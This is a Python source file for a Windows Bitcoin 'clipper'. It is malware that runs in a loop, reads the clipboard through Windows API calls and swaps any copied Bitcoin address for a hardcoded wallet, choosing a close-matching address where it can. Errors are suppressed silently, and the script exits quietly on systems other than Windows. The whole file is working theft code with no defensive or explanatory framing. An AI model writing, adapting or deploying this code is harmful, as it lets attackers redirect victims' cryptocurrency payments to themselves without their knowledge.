from difflib import get_close_matches
import ctypes.wintypes
import ctypes
import time
import os
import re

if os.name != 'nt':
    os._exit(0)
#Windows check

class Clip:
    '''
    Basic Bitcoin Clipper for Windows, which tries to fetch,
    the closest matching BTC address based on clipboard data
    '''

    def __init__(self):
        self.wallets = ['36AQZhpMzMfvC3cGuDPKdWdDntnMgBywLT'] #First address should be the MAIN BTC address
        self.address_regex = r'\b(bc(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|[13][a-km-zA-HJ-NP-Z1-9]{25,35})\b'

        self.user32 = ctypes.WinDLL('user32')
        self.kernel32 = ctypes.WinDLL('kernel32')

        self.OpenClipboard = self.user32.OpenClipboard
        self.OpenClipboard.argtypes = ctypes.wintypes.HWND,
        self.OpenClipboard.restype = ctypes.wintypes.BOOL

        self.GetClipboardData = self.user32.GetClipboardData
        self.GetClipboardData.argtypes = ctypes.wintypes.UINT,
        self.GetClipboardData.restype = ctypes.wintypes.HANDLE

        self.EmptyClipboard = self.user32.EmptyClipboard
        self.EmptyClipboard.restype = ctypes.wintypes.BOOL

        self.SetClipboardData = self.user32.SetClipboardData
        self.SetClipboardData.argtypes = ctypes.wintypes.UINT, ctypes.wintypes.HANDLE,
        self.SetClipboardData.restype = ctypes.wintypes.HANDLE

        self.CloseClipboard = self.user32.CloseClipboard
        self.CloseClipboard.argtypes = None
        self.CloseClipboard.restype = ctypes.wintypes.BOOL

        self.GlobalAlloc = self.kernel32.GlobalAlloc
        self.GlobalAlloc.argtypes = ctypes.wintypes.UINT, ctypes.wintypes.ctypes.c_size_t,
        self.GlobalAlloc.restype = ctypes.wintypes.HGLOBAL

        self.GlobalLock = self.kernel32.GlobalLock
        self.GlobalLock.argtypes = ctypes.wintypes.HGLOBAL,
        self.GlobalLock.restype = ctypes.wintypes.LPVOID

        self.GlobalUnlock = self.kernel32.GlobalUnlock
        self.GlobalUnlock.argtypes = ctypes.wintypes.HGLOBAL,
        self.GlobalUnlock.restype = ctypes.wintypes.BOOL

        self.GlobalSize = self.kernel32.GlobalSize
        self.GlobalSize.argtypes = ctypes.wintypes.HGLOBAL,
        self.GlobalSize.restype = ctypes.wintypes.ctypes.c_size_t

    def closest_match(self, address):
        return get_close_matches(address, self.wallets)

    def validate_address(self, data):
        if re.match(self.address_regex, data):
            return True
        else:
            return False

    def btc_clipper(self):
        while True:
            try:
                clipboad_data = self.get_clipboard()

                if self.validate_address(clipboad_data):
                    address_matches = self.closest_match(clipboad_data)
                    data = [address_matches[0].strip() if address_matches else self.wallets[0].strip()][0]

                    if clipboad_data not in self.wallets:
                        self.set_clipboard(data)

            except Exception:
                pass

            time.sleep(1)

    def get_clipboard(self):
        self.OpenClipboard(None)

        handle = self.GetClipboardData(13)
        contents = self.GlobalLock(handle)
        size = self.GlobalSize(handle)

        if contents and size:
            raw_data = ctypes.create_string_buffer(size)
            ctypes.memmove(raw_data, contents, size)
            data = raw_data.raw.decode('utf-16le').strip(u'\0')

        self.GlobalUnlock(handle)
        self.CloseClipboard()

        return data

    def set_clipboard(self, data):
        if not isinstance(data, type(u'')):
            data = data.decode('mbcs')
        data = data.encode('utf-16le')

        self.OpenClipboard(None)
        self.EmptyClipboard()

        handle = self.GlobalAlloc(0x0042, len(data) + 2)
        contents = self.GlobalLock(handle)
        ctypes.memmove(contents, data, len(data))

        self.GlobalUnlock(handle)
        self.SetClipboardData(13, handle)
        self.CloseClipboard()

if __name__ == '__main__':
    clip = Clip()
    clip.btc_clipper()
